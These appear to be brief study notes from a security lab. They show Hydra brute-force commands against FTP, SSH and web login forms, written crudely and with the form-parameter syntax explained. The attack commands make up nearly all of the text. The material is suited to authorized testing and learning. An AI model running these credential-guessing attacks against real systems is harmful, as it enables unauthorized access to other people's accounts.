# Hydra

You use this bitch to brute force logins

Example:

To brute force an ftp server where you know the username, you would use 
`hydra -l user -P password.txt ftp://ipaddress`

<hr />

You can also use it for an ssh server:
`hydra -l user -P password.txt ipaddress -t 4 ssh`

<hr />

You can also use it for a web form. You must know what type of request it's making, which is usually GET or POST, use the developer tools to see what type of request the form is making. 
`sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"`

- <path> - the login page URL, for example, login.php
- <login_credentials> - the username and password used to log in, for example, username=^USER^&password=^PASS^
- <invalid_response> - part of the response when the login fails

A more concrete example would be: 
`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

<hr />




